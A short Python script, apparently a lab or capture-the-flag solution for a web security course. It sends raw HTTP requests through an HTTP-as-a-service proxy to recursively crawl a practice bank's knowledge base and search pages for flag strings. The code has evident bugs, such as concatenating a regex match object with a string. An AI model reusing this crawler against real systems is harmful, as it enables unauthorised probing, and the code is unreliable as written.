import requests
import urllib
from bs4 import BeautifulSoup
import re
import sys

def crawl_dfs(initial, path):
    url='https://haas.quoccabank.com'
    payload = 'GET '+path+' HTTP/1.1\nhost: kb.quoccabank.com'
    obj = {'request': payload}
    obj= urllib.parse.urlencode(obj)
    response = requests.post(url, params=obj, cert=cert)
    soup = BeautifulSoup(response.content, 'html.parser')
    path = path[:-1]
    
    
    result = re.search('COMP', response.text);
    if result:
        sys.stdout.write(result + '\n')
        sys.stdout.write(response.text + '\n')
    else:
        sys.stdout.write('unsuccessful' + '\n')


    for link in soup.find_all('a'):
        link = link['href'][1:]
        child = initial[:-1] +link
        if(child not in ht):
            ht[child] = 1 
            sys.stdout.write(child+'\n')
            crawl_dfs(initial, child)
        else:
            continue

    return 

'''
initialisation
'''
path=""
cert= ('/home/fafnir/cert/6843.pem', '/home/fafnir/cert/6843.key');
url='https://haas.quoccabank.com'
payload = 'GET /'+path+' HTTP/1.1\nhost: kb.quoccabank.com'
obj = {'request': payload}
obj= urllib.parse.urlencode(obj)
response = requests.post(url, params=obj, cert=cert)
soup = BeautifulSoup(response.content, 'html.parser')
ht = {}


'''
question 1
'''

#path = '/7643dc3d-2262-4f1c-8fb9-197860946a66.html'
#crawl_dfs("",path)




#initial question for deep
deep= soup.find_all('a')[1]
path = deep['href']
crawl_dfs(path, path)
